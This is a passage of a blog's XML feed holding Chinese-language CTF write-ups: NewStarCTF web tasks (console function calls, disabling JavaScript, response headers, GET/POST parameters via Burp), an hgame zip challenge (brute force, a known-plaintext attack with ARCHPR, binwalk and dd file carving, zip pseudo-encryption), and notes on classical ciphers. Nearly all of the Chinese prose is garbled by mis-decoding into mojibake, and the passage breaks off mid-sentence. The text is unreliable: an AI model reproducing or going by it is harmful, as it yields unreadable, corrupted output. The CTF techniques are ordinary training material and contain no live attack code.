154659"></p><p>æç¤ºåœ¨æ§åˆ¶å°è¿›è¡Œåº”ç”¨<br>ä¾æ—§æŸ¥çœ‹ç½‘é¡µæºä»£ç <img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20194122.png" alt="å±å¹•æˆªå›¾ 2024-11-28 194122"></p><p>å¯è§ä¼ ä¸€ä¸ªå‚æ•°ï¼ˆè¯¾ç¨‹åï¼‰è°ƒç”¨å‡½æ•°revealFlag<br>è¯¾ç¨‹å</p><p>åœ¨æ§åˆ¶å°è¾“å…¥å‘½ä»¤</p><p>![å±å¹•æˆªå›¾ 2024-11-28 203252](C:\Users\Lenovo\Pictures\Screenshots\å±å¹•æˆªå›¾ 2024-11-28 203252.png)<br>revealFlagï¼ˆâ€™4cqu1siti0nâ€˜)<br>å¾—åˆ°ç¬¬äºŒéƒ¨åˆ†flag å’Œè¿›å…¥ç¬¬ä¸‰éƒ¨åˆ†çš„ç½‘å€</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20204212.png" alt="å±å¹•æˆªå›¾ 2024-11-28 204212"></p><p>è¿›å…¥ç¬¬ä¸‰éƒ¨åˆ†</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20204321.png" alt="å±å¹•æˆªå›¾ 2024-11-28 204321"></p><p>ä¾æ—§æ˜¯æŸ¥çœ‹ç½‘é¡µæºä»£ç  å¤åˆ¶ä¸»ä½“éƒ¨åˆ†ç»™ai</p><p>å¯è§æˆ‘ä»¬è¦æŠŠçŠ¶æ€æ”¹ä¸ºè§£å°ç„¶åç‚¹å‡»è§£å°æŒ‰é’®</p><p>æŠŠå‰ç«¯ä»£<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20225511.png" alt="å±å¹•æˆªå›¾ 2024-11-28 225511"></p><p>ç ä¿®æ”¹ä¸€ä¸‹ä¿å­˜</p><p>å¾—åˆ°ç¬¬ä¸‰éƒ¨åˆ†flagå’Œç¬¬å››éƒ¨åˆ†åœ°å€</p><p>è¿›å…¥ç¬¬å››éƒ¨åˆ†</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20161927.png" alt="å±å¹•æˆªå›¾ 2024-11-28 161927"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20225709.png" alt="å±å¹•æˆªå›¾ 2024-11-28 225709"></p><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç° noscriptä»£ç éƒ¨åˆ†æ‰§è¡Œåä¼šæ˜¾ç¤ºå‡ºflag<br>æœç´¢åå¾—çŸ¥å¯ä»¥åœ¨ç½‘é¡µä¸­ç¦ç”¨JavaScript<br>æ›´æ”¹ååˆ·æ–°</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20230037.png" alt="å±å¹•æˆªå›¾ 2024-11-28 230037"></p><p>å¾—åˆ°æœ€åä¸€éƒ¨åˆ†flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20230131.png"></p><p>å°†æ¯ä¸€éƒ¨åˆ†è·å¾—çš„flagæ‹¼æ¥åœ¨ä¸€èµ· æ¨æµ‹æ˜¯base64ç¼–ç </p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%25E5%25B1%258F%25E5%25B9%2595%25E6%2588%25AA%25E5%259B%25BE%25202024-11-28%2520230356.png" alt="å±å¹•æˆªå›¾ 2024-11-28 230356"></p><p>è§£ç åå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20230356.png" alt="å±å¹•æˆªå›¾ 2024-11-28 230356"></p><h1 id="2-headache3"><a href="#2-headache3" class="headerlink" title="2.headache3"></a>2.headache3</h1><p>æ‰“å¼€åä¾æ—§å…ˆçœ‹ä¸€ä¸‹æºä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20231349.png" alt="å±å¹•æˆªå›¾ 2024-11-28 231349"></p><p>ååˆ†ç®€å•æ²¡ä»€ä¹ˆå†…å®¹ ä½†æ˜¯headå¤§å†™å¯èƒ½æ˜¯æŸ¥çœ‹ä»€ä¹ˆæ–‡ä»¶å¤´</p><p>åœ¨åˆ·æ–°ä¸€ä¸‹ networkéƒ¨åˆ†å¾—åˆ°äº†ä¸€ä¸ªå“åº”åŒ…<br>æ–‡ä»¶å¤´éƒ¨åˆ†æœ‰flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%25E5%25B1%258F%25E5%25B9%2595%25E6%2588%25AA%25E5%259B%25BE%25202024-11-28%2520231625.png" alt="å±å¹•æˆªå›¾ 2024-11-28 231625"></p><h1 id="3-get"><a href="#3-get" class="headerlink" title="3.get"></a>3.get</h1><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20232121.png" alt="å±å¹•æˆªå›¾ 2024-11-28 232121"></p><p>è·å¾—é¢˜ç›®åå‘ç°æ˜¯è®©getä¼ å‚<br>ç›´æ¥åœ¨åœ°å€æ é‡ŒæŒ‰ç…§è¦æ±‚è¾“å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20232215.png" alt="å±å¹•æˆªå›¾ 2024-11-28 232215"></p><h1 id="4-POST"><a href="#4-POST" class="headerlink" title="4.POST"></a>4.POST</h1><p>å¯ç”¨åœºæ™¯åå‘ç°æ˜¯è¦postä¼ å‚</p><p>burpæŠ“åŒ…ä¸€ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%25E5%25B1%258F%25E5%25B9%2595%25E6%2588%25AA%25E5%259B%25BE%25202024-11-28%2520232751.png" alt="å±å¹•æˆªå›¾ 2024-11-28 232751"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20232836.png" alt="å±å¹•æˆªå›¾ 2024-11-28 232836"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20232942.png" alt="å±å¹•æˆªå›¾ 2024-11-28 232942"></p><p>å³é”®ä¿®æ”¹è¯·æ±‚æ–¹å¼<br>ä¼ å‚ï¼ˆpostä¼ å‚è¦å…ˆç©ºä¸€è¡Œå†ä¼ å‚ï¼‰</p><p>![å±å¹•æˆªå›¾ 2024-11-28 233217](C:\Users\Lenovo\Pictures\Screenshots\å±å¹•æˆªå›¾ 2024-11-28 233217.png)</p><p>ä½†æ˜¯è¿™æ ·ä¼ å‚åªèƒ½å¾—åˆ°å­—ç¬¦ä¸²â€˜flagâ€™ æŸ¥çœ‹è¯„è®ºåå‘ç°è¾“å…¥what&#x3D;flag&amp;&#x3D;<br>å¯ä»¥å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20234701.png" alt="å±å¹•æˆªå›¾ 2024-11-28 234701"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>å®æ“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NewStarCTF2024</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è¿™ä¸ªå‹ç¼©åŒ…æœ‰ç‚¹éº»çƒ¦</title>
    <link href="/2024/12/05/%E8%BF%99%E4%B8%AA%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%9C%89%E7%82%B9%E9%BA%BB%E7%83%A6/"/>
    <url>/2024/12/05/%E8%BF%99%E4%B8%AA%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%9C%89%E7%82%B9%E9%BA%BB%E7%83%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><h2 id="1-è¿™ä¸ªå‹ç¼©åŒ…æœ‰ç‚¹éº»çƒ¦"><a href="#1-è¿™ä¸ªå‹ç¼©åŒ…æœ‰ç‚¹éº»çƒ¦" class="headerlink" title="1.è¿™ä¸ªå‹ç¼©åŒ…æœ‰ç‚¹éº»çƒ¦"></a>1.è¿™ä¸ªå‹ç¼©åŒ…æœ‰ç‚¹éº»çƒ¦</h2><p>ä¸‹è½½å‹ç¼©åŒ…å¯ä»¥çœ‹åˆ°æœ‰æ³¨é‡Šï¼Œæç¤ºæ˜¯å…­ä½æ•°å­—çš„æš´åŠ›ç ´è§£</p><p>æš´åŠ›ç ´è§£å¾—åˆ°å¯†ç </p><p>å¯†ç ä¸º 483279</p><p>æ‰“å¼€æ–‡æ¡£åçœ‹åˆ°æç¤º</p><p>å¯ä»¥ç¡®å®šæ˜¯ä½¿ç”¨å­—å…¸çˆ†ç ´</p><p>â€‹    å¾—åˆ°å‹ç¼©åŒ…å¯†ç     &amp;-&#96;;qpCKliw2yTR\</p><p>zipå‹ç¼©åŒ…é‡Œé¢è¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶å’Œä¹‹å‰çš„readmeæ˜¯ä¸€æ ·çš„æ–‡ä»¶ï¼ˆå·²çŸ¥éƒ¨åˆ†æ˜æ–‡ï¼‰ï¼Œæ‰€ä»¥ç›´æ¥æ˜æ–‡æ”»å‡»<br>æ ¹æ®æç¤ºï¼šæ³¨æ„å°†æ˜æ–‡å‹ç¼©æ—¶ï¼Œå‹ç¼©åŒ…çš„å±æ€§è¦è®¾ç½®ä¸º<strong>ä»…å‚¨å­˜</strong></p><p>ç¡®ä¿å‹ç¼©åçš„zipä¸åŒåæ–‡æ¡£CRC32ç ä¸€è‡´</p><h3 id="å·²çŸ¥æ˜æ–‡æ”»å‡»çš„æ–¹æ³•"><a href="#å·²çŸ¥æ˜æ–‡æ”»å‡»çš„æ–¹æ³•" class="headerlink" title="å·²çŸ¥æ˜æ–‡æ”»å‡»çš„æ–¹æ³•"></a>å·²çŸ¥æ˜æ–‡æ”»å‡»çš„æ–¹æ³•</h3><p>å·²çŸ¥æ˜æ–‡æ”»å‡»çš„ç‰¹ç‚¹æ˜¯å·²çŸ¥ä¸€ä¸ªZIPå‹ç¼©åŒ…ä¸­æŸä¸ªæ–‡ä»¶çš„åŸæ–‡ä»¶ï¼ˆä¹Ÿå°±æ˜¯æ˜æ–‡ï¼‰ï¼Œåˆ©ç”¨å·²çŸ¥æ–‡ä»¶å’Œå…¶å‹ç¼©åŠ å¯†åçš„æ•°æ®è·å–åˆ°å‹ç¼©åŒ…çš„è§£å‹å¯†ç æˆ–è€…èƒ½å¯¹å…¶è§£å‹ã€‚</p><p>å¸¸è§„å·²çŸ¥æ˜æ–‡æ”»å‡»è¦æƒ³æˆåŠŸï¼Œéœ€è¦å…·å¤‡3ä¸ªæ¡ä»¶ï¼š</p><p> 1ï¼‰å®Œæ•´çš„æ˜æ–‡æ–‡ä»¶ã€‚</p><p> 2ï¼‰æ˜æ–‡æ–‡ä»¶éœ€è¦è¢«ç›¸åŒçš„å‹ç¼©ç®—æ³•æ ‡å‡†å‹ç¼©ï¼ˆä¹Ÿå¯ç†è§£ä¸ºè¢«ç›¸åŒå‹ç¼©å·¥å…·å‹ç¼©ï¼‰ã€‚</p><p> 3ï¼‰æ˜æ–‡å¯¹åº”æ–‡ä»¶çš„åŠ å¯†ç®—æ³•æ˜¯ZipCrypto Storeã€‚</p><p>åªéœ€è¦è®°ä½ï¼Œå³ä½¿åœ¨æ²¡æœ‰å‹ç¼©å¯†ç çš„æƒ…å†µä¸‹ï¼Œåªè¦èƒ½è·å–3ä¸ªå¯†é’¥ï¼Œå°±èƒ½å®ç°è§£å¯†ã€‚å¦‚æœæˆ‘ä»¬å·²çŸ¥å‹ç¼©åŒ…ä¸­çš„æŸä¸ªæ–‡ä»¶ï¼Œå°±å¯ä»¥åˆ©ç”¨ç®—æ³•è·å–è¿™3ä¸ªå¯†é’¥</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205005520726.png" alt="image-20241205005520726"></p><p>å•å‡»â€œå¼€å§‹â€æŒ‰é’®åï¼Œç ´è§£å¼€å§‹ã€‚ä½¿ç”¨ARCHPRè¿›è¡Œå·² çŸ¥æ˜æ–‡æ”»å‡»æ—¶æœ‰ä¸€ä¸ªé‡å¤§BUGï¼Œå³ä½¿å·¥å…·å·²ç»æ¢å¤å‡º3ä¸ªå¯†é’¥ï¼Œç¨‹åºä¹Ÿä¸ä¼šè‡ªåŠ¨åœæ­¢ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æš‚åœã€‚æ ¹æ®æ¯”èµ›ç»éªŒï¼Œä¸€èˆ¬ç¨‹åºè¿è¡Œ20 ï½30åˆ†é’Ÿå°±å¯ä»¥æ‰‹åŠ¨åœæ­¢ï¼Œå¦‚æœARCHPRæ‰¾åˆ°äº†3ä¸ªå¯†é’¥ï¼Œä¹Ÿå°±æ˜¯å›¾ 1.5.23ä¸­çš„åŠ å¯†å¯†é’¥ï¼Œé‚£ä¹ˆå•å‡»â€œåœæ­¢â€åä¼šè‡ªåŠ¨å¼¹å‡ºçª—å£</p><p>å•å‡»â€œç¡®å®šâ€åï¼Œä¼šå¼¹å‡ºæ–°çš„ä¿å­˜æ–‡ä»¶çª—å£</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205013556922.png" alt="image-20241205013556922"></p><p>å‹ç¼©åŒ…é‡Œåªæœ‰ä¸€å¼ ipgæ ¼å¼çš„æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205014603949.png" alt="image-20241205014603949"></p><h3 id="åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶"><a href="#åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶" class="headerlink" title="åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶"></a>åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶</h3><h4 id="å›¾ç‰‡åˆ†æ"><a href="#å›¾ç‰‡åˆ†æ" class="headerlink" title="å›¾ç‰‡åˆ†æ"></a>å›¾ç‰‡åˆ†æ</h4><p>é¦–å…ˆå¯¹å›¾ç‰‡è¿›è¡Œåˆ†æï¼Œç”¨binwalkï¼ˆ<a href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a>ä¸­æ˜¯è‡ªå¸¦çš„ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½åˆ°windowsä¸­ä½¿ç”¨ï¼‰ã€‚</p><p>ä½¿ç”¨æ–¹æ³•ï¼šbinwalk + æ–‡ä»¶è·¯å¾„&#x2F;æ–‡ä»¶å</p><p>æ‰§è¡Œå‘½ä»¤åï¼Œbinwalkå°±ä¼šè‡ªåŠ¨åˆ†æè¿™ä¸ªjpgæ–‡ä»¶ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205015107323.png" alt="image-20241205015107323"></p><p>ä»åˆ†æçš„ç»“æœçœ‹ï¼Œè¿™ä¸ªjpgæ–‡ä»¶éšè—ç€ä¸€ä¸ªzipæ–‡ä»¶</p><h4 id="å›¾ç‰‡åˆ†ç¦»"><a href="#å›¾ç‰‡åˆ†ç¦»" class="headerlink" title="å›¾ç‰‡åˆ†ç¦»"></a>å›¾ç‰‡åˆ†ç¦»</h4><p>1,binwalkåˆ†ç¦»</p><p>è¿˜æ˜¯ä½¿ç”¨binwalkå·¥å…·ï¼Œä½¿ç”¨ddå‘½ä»¤åˆ†ç¦»å‡ºéšè—æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=flag.jpg of=1.zip skip=20421 bs=1<br><br></code></pre></td></tr></table></figure><p>è§£é‡Šï¼šif æŒ‡å®šè¾“å…¥æ–‡ä»¶ï¼Œof æŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œskip æŒ‡å®šä»è¾“å…¥æ–‡ä»¶å¼€å¤´è·³è¿‡20421ä¸ªå—åå¼€å§‹å¤åˆ¶ï¼Œbsè®¾ç½®æ¯æ¬¡è¯»å†™å—çš„å¤§å°ä¸º1å­—èŠ‚</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205020021102.png" alt="image-20241205020021102"></p><p>æ‰§è¡Œåä¼šå¾—åˆ°ä¸€ä¸ª1.zipæ–‡ä»¶ã€‚</p><p>2.hexç¼–è¾‘å™¨åˆ†ç±»</p><p>ç»è¿‡åˆ†æipgæ–‡ä»¶é‡Œéšè—äº†ä¸€ä¸ªzipå‹ç¼©åŒ…</p><p>æœç´¢åå…­è¿›åˆ¶æ•°å€¼ç¡®å®šzipæ–‡ä»¶å¤´</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205113642931.png" alt="image-20241205113642931"></p><p>ä½œä¸ºé€‰å—èµ·å§‹ä½ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205113826881.png" alt="image-20241205113826881"></p><p>æœ€åä½œä¸ºé€‰å—ç»“æŸä½ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205113938357.png" alt="image-20241205113938357"></p><p>å¤åˆ¶é€‰å—è‡³æ–°æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205114028296.png" alt="image-20241205114028296"></p><p>å¾—åˆ°ä¸€ä¸ªzipå‹ç¼©åŒ…</p><p>æ‰“å¼€å‘ç°é‡Œé¢æœ‰ä¸€å¼ ipgå›¾ç‰‡ éœ€è¦è¾“å…¥å¯†ç </p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205114206621.png" alt="image-20241205114206621"></p><h3 id="zipä¼ªåŠ å¯†"><a href="#zipä¼ªåŠ å¯†" class="headerlink" title="zipä¼ªåŠ å¯†"></a>zipä¼ªåŠ å¯†</h3><p>ä¼ªåŠ å¯†çš„åŸç†æ˜¯ï¼šZIPå‹ç¼©åŒ…ç”Ÿæˆæ—¶æ²¡æœ‰åŠ å¯†ï¼Œæ‰‹å·¥ä¿® æ”¹â€œfrFlagsâ€æˆ–â€œdeFlagsâ€çš„å€¼ï¼Œä½¿å¾—åŒä¸€ä¸ªæ–‡ä»¶çš„è¿™ä¸¤ä¸ªå­—æ®µä¸­ è‡³å°‘ä¸€ä¸ª ä¸ºå¥‡æ•°ï¼Œè¿™æ ·åœ¨è§£å‹æ—¶ä¼šå¼¹å‡ºå¯†ç è¾“å…¥æ¡†ï¼Œæ— è®ºè¾“å…¥ä»€ä¹ˆå¯†ç éƒ½ä¼šæŠ¥ é”™ã€‚è¿™ç§åŸå‹ç¼©åŒ…æ²¡æœ‰åŠ å¯†ï¼Œä½†é€šè¿‡äººå·¥ä¿®æ”¹é€ æˆè§£å‹æ—¶éœ€è¦è¾“å…¥å¯† ç çš„ç°è±¡ï¼Œå°±å«ä½œä¼ªåŠ å¯†ã€‚</p><p>ç ´è§£ZIPä¼ªåŠ å¯†çš„æ–¹æ³•ååˆ†ç®€å•ã€‚</p><p>å¦‚æœâ€œfrFlagsâ€å’Œâ€œdeFlagsâ€çš„å€¼ä¸ç›¸ åŒï¼Œä¾‹å¦‚ï¼Œâ€œfrFlagsâ€çš„å€¼æ˜¯å¥‡æ•°ï¼Œâ€œdeFlagsâ€çš„å€¼æ˜¯å¶æ•°ï¼Œé‚£ä¹ˆå¯ä»¥ æŠŠâ€œfrFlagsâ€çš„å€¼æ”¹ä¸ºâ€œdeFlagsâ€çš„å€¼ï¼Œç„¶åè§£å‹æŸ¥çœ‹ç»“æœã€‚</p><p>ä½¿â€œfrFlagsâ€å’Œâ€œdeFlagsâ€éƒ½æ˜¯åŒä¸€ä¸ªå¥‡æ•°ï¼Œæˆ‘ä»¬ä»ç„¶æ€€ç–‘è¯¥ZIPæ–‡ä»¶å­˜ åœ¨ä¼ªåŠ å¯†ï¼Œé‚£ä¹ˆå¯ä»¥æŠŠè¿™ä¸¤ä¸ªå­—æ®µçš„å€¼éƒ½ å‡1ï¼Œæ”¹ä¸ºç›¸åŒçš„å¶æ•°ï¼Œç„¶å è¿›è¡Œè§£å‹æŸ¥çœ‹å…¶ç»“æœã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205115502622.png" alt="image-20241205115502622"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205115520321.png" alt="image-20241205115520321"></p><p>å¦‚å›¾æŠŠä¸¤ä¸ªå€¼éƒ½æ”¹ä¸º8 </p><p>æˆåŠŸæ‰“å¼€å‹ç¼©åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205115606936.png" alt="image-20241205115606936"></p><p>å¾—åˆ°æœ€ç»ˆflag</p><p>hgame{W0w!_y0U_Kn0w_z1p_3ncrYpt!}</p>]]></content>
    
    
    <categories>
      
      <category>å®æ“</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Misc</tag>
      
      <tag>å·²çŸ¥æ˜æ–‡æ”»å‡»</tag>
      
      <tag>æ–‡ä»¶åˆ†ç¦»</tag>
      
      <tag>zipä¼ªåŠ å¯†</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>week2</title>
    <link href="/2024/10/27/week2/"/>
    <url>/2024/10/27/week2/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¼–ç è§£ç "><a href="#ç¼–ç è§£ç " class="headerlink" title="ç¼–ç è§£ç "></a>ç¼–ç è§£ç </h1><h2 id="å¤å…¸å¯†ç "><a href="#å¤å…¸å¯†ç " class="headerlink" title="å¤å…¸å¯†ç "></a>å¤å…¸å¯†ç </h2><p>ã€å¤å…¸å¯†ç ã€‘æ˜¯å¯†ç å­¦ä¸­çš„å…¶ä¸­ä¸€ä¸ªç±»å‹ï¼Œå…¶å¤§éƒ¨åˆ†åŠ å¯†æ–¹å¼éƒ½æ˜¯åˆ©ç”¨ <em>æ›¿æ¢å¼å¯†ç </em> æˆ– <em>ç§»é¡¹å¼å¯†ç </em>ï¼Œæœ‰æ—¶åˆ™æ˜¯ä¸¤è€… çš„æ··åˆã€‚</p><h3 id="å‡¯æ’’å¯†ç "><a href="#å‡¯æ’’å¯†ç " class="headerlink" title="å‡¯æ’’å¯†ç "></a>å‡¯æ’’å¯†ç </h3><p>å®ƒæ˜¯ä¸€ç§æ›¿æ¢åŠ å¯†çš„æŠ€æœ¯ï¼Œæ˜æ–‡ä¸­çš„æ‰€æœ‰å­—æ¯éƒ½åœ¨å­—æ¯è¡¨ä¸Šå‘åï¼ˆæˆ–å‘å‰ï¼‰æŒ‰ç…§ä¸€ä¸ªå›ºå®šæ•°ç›®è¿›è¡Œåç§»åè¢«æ›¿æ¢æˆ å¯†æ–‡ã€‚ ä¾‹å¦‚ï¼Œå½“åç§»é‡æ˜¯3çš„æ—¶å€™ï¼Œæ‰€æœ‰çš„å­—æ¯Aå°†è¢«æ›¿æ¢æˆDï¼ŒBå˜æˆEã€‚<br>é€šè¿‡æ’åˆ—æ˜æ–‡å’Œå¯†æ–‡å­—æ¯è¡¨ï¼Œå¯†æ–‡å­—æ¯è¡¨ç¤ºé€šè¿‡å°†æ˜æ–‡å­—æ¯è¡¨å‘å·¦æˆ–å‘å³ç§»åŠ¨ä¸€ä¸ªå›ºå®šæ•°ç›®çš„ä½ç½®ã€‚ä¾‹å¦‚ï¼Œå½“åç§» é‡æ˜¯å·¦ç§»3çš„æ—¶å€™ï¼ˆè§£å¯†æ—¶çš„å¯†é’¥å°±æ˜¯3ï¼‰<br>![[Pasted image 20241024224947.png]]</p><h3 id="ç»´å‰å°¼äºšå¯†ç "><a href="#ç»´å‰å°¼äºšå¯†ç " class="headerlink" title="ç»´å‰å°¼äºšå¯†ç "></a>ç»´å‰å°¼äºšå¯†ç </h3><p>æ˜¯ç”±ä¸€äº›åç§»é‡ä¸åŒçš„æºæ’’å¯†ç ç»„æˆã€‚ ä¸ºäº†ç”Ÿæˆå¯†ç ï¼Œéœ€è¦ä½¿ç”¨è¡¨æ ¼æ³•ã€‚ è¿™ä¸€è¡¨æ ¼åŒ…æ‹¬äº†26è¡Œå­—æ¯è¡¨ï¼Œæ¯ä¸€è¡Œéƒ½ç”±å‰ä¸€è¡Œå‘å·¦åç§»ä¸€ä½å¾—åˆ°ã€‚å…·ä½“ä½¿ç”¨å“ªä¸€è¡Œå­—æ¯è¡¨è¿›è¡Œç¼–è¯‘æ˜¯åŸºäºå¯†é’¥è¿› è¡Œçš„ï¼Œåœ¨è¿‡ç¨‹ä¸­ä¼šä¸æ–­åœ°å˜æ¢<br><strong>åŠ å¯†è¿‡ç¨‹</strong>ï¼š<br>å¯†é’¥å¾ªç¯ä¸æ˜æ–‡å¯¹åº”è¡¨æ ¼å¾—åˆ°å¯†æ–‡<br><strong>è§£å¯†è¿‡ç¨‹</strong>ï¼šæ‰¾åˆ°å¯†é’¥ä¸€åˆ—å¯†æ–‡å¯¹åº”å“ªä¸€è¡Œ<br>![[Pasted image 20241024225437.png]]</p><p>å‡è®¾æ˜æ–‡ä¸ºï¼šHEETIAN ç„¶åé€‰æ‹©æŸä¸€å…³é”®è¯å¹¶é‡å¤è€Œå¾—åˆ°å¯†é’¥ï¼Œå¦‚å…³é”®è¯ä¸ºLABæ—¶ï¼Œå¯†é’¥ä¸ºï¼šLABLABL å¯¹äºæ˜æ–‡çš„ç¬¬ä¸€ä¸ªå­—æ¯Hï¼Œå¯¹åº”å¯†é’¥çš„ç¬¬ä¸€ä¸ªå­—æ¯Lï¼Œäºæ˜¯ä½¿ç”¨è¡¨æ ¼ä¸­Lè¡Œå­—æ¯è¡¨è¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°å¯†æ–‡ç¬¬ä¸€ä¸ªå­—æ¯Sã€‚ ç±»ä¼¼åœ°ï¼Œæ˜æ–‡ç¬¬äºŒä¸ªå­—æ¯ä¸ºEï¼Œåœ¨è¡¨æ ¼ä¸­ä½¿ç”¨å¯¹åº”çš„Aè¡Œè¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°å¯†æ–‡ç¬¬äºŒä¸ªå­—æ¯Eã€‚ä»¥æ­¤ç±»æ¨ï¼Œå¯ä»¥å¾—åˆ°ï¼š<br>æ˜æ–‡ï¼šHEETIAN å¯†é’¥ï¼šLABLABL å¯†æ–‡ï¼šSEFEIBY<br>è§£å¯†çš„è¿‡ç¨‹åˆ™ä¸åŠ å¯†ç›¸åã€‚ ä¾‹å¦‚ï¼šæ ¹æ®å¯†é’¥ç¬¬ä¸€ä¸ªå­—æ¯Læ‰€å¯¹åº”çš„Lè¡Œå­—æ¯è¡¨ï¼Œå‘ç°å¯†æ–‡ç¬¬ä¸€ä¸ªå­—æ¯Sä½äºHåˆ—ï¼Œå› è€Œæ˜æ–‡ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºHã€‚ å¯†é’¥ç¬¬äºŒä¸ªå­—æ¯Aå¯¹åº”Aè¡Œå­—æ¯è¡¨ï¼Œè€Œå¯†æ–‡ç¬¬äºŒä¸ªå­—æ¯Eä½äºæ­¤è¡ŒEåˆ—ï¼Œå› è€Œæ˜æ–‡ç¬¬äºŒä¸ªå­—æ¯ä¸ºEã€‚ä»¥æ­¤ç±»æ¨ä¾¿å¯å¾—åˆ°æ˜æ–‡</p><h3 id="åŸ¹æ ¹å¯†ç "><a href="#åŸ¹æ ¹å¯†ç " class="headerlink" title="åŸ¹æ ¹å¯†ç "></a>åŸ¹æ ¹å¯†ç </h3><p>åŸ¹æ ¹å¯†ç çš„æœ¬è´¨æ˜¯å°†å­—æ¯ç”¨ä¸€ä¸²äºŒè¿›åˆ¶æ•°æ›¿æ¢ï¼Œä½†æ˜¯è¡¨ç¤ºçš„è¿‡ç¨‹ä¸­ï¼Œæ²¡æœ‰é‡‡å–0å’Œ1çš„å½¢å¼ï¼Œè€Œä½¿ç”¨aå’Œbæ¥ä»£æ›¿<br><strong>åŠ å¯†çš„è¿‡ç¨‹</strong><br>é¦–å…ˆå°†è¦åŠ å¯†çš„å†…å®¹æ ¹æ®åŠ å¯†è¡¨é‡Œçš„å†…å®¹è¿›è¡Œæ›¿æ¢ï¼Œ å¦‚aç”¨AAAAAæ›¿æ¢ï¼Œbç”¨AAAABæ›¿æ¢ã€‚ æ›¿æ¢å®Œä¹‹ 